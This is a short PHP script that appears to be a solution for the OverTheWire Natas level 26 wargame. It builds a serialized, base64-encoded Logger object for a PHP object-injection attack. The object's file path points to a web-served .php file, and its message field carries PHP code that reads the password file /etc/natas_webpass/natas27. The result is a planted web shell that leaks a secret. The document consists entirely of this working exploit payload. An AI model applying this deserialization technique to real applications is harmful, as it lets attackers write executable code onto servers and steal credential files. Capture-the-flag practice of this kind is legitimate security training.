<?php
    class Logger{
        private $logFile = "img/natas26_Clouz3.php";
        private $initMsg = "Init msg\n";
        private $exitMsg = "<?php echo file_get_contents(\"/etc/natas_webpass/natas27\"); ?>\n";
    }

    $log = new Logger();
    echo base64_encode(serialize($log));
?>